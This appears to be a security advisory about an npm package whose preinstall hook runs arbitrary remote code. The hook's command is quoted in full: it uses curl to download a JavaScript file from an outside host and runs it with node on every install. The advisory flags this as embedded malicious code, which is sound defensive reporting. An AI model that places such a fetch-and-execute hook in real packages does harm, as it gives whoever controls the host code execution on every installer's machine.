summary: preinstall hook downloads and executes remote JavaScript from third-party host
details: package.json declares a preinstall lifecycle script `curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js`. On every `npm install`, the package fetches an unpinned, mutable JavaScript file from poc.amanrawat.com and immediately executes it under Node.js with the installer's privileges. The fetched payload is not version-pinned, not hash-verified, and not hosted on the package's publisher infrastructure or the npm registry, so whoever controls poc.amanrawat.com can ship arbitrary code to every installer at any time. This is the canonical install-time RCE pattern and fires automatically on default install with no user interaction.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
